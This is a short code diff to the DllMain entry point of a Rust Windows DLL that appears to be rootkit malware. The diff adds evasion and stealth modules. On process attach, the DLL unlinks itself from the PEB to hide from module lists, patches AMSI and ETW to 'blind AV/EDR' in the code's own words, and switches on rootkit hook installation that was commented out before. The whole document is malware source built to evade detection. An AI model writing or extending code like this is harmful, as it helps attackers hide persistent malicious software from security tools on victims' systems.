@@ -4,6 +4,8 @@ use winapi::um::winnt::DLL_PROCESS_ATTACH;
 
 mod vm_detect;
 mod rootkit;
+mod evasion;
+mod stealth;
 
 #[no_mangle]
 pub extern "system" fn DllMain(
@@ -13,8 +15,16 @@ pub extern "system" fn DllMain(
 ) -> BOOL {
     match call_reason {
         DLL_PROCESS_ATTACH => {
+            // 1. Vanish: Unlink from PEB immediately to hide from module lists
+            let _ = stealth::unlink_peb();
+
+            // 2. Blind: Patch AMSI and ETW to blind AV/EDR
+            let _ = evasion::patch_amsi();
+            let _ = evasion::patch_etw();
+
+            // 3. Hook: Install the rootkit hooks
             // Optional: Auto-initialize if injected via traditional methods
-            // rootkit::install_hooks();
+            rootkit::install_hooks().ok();
         }
         _ => {}
     }
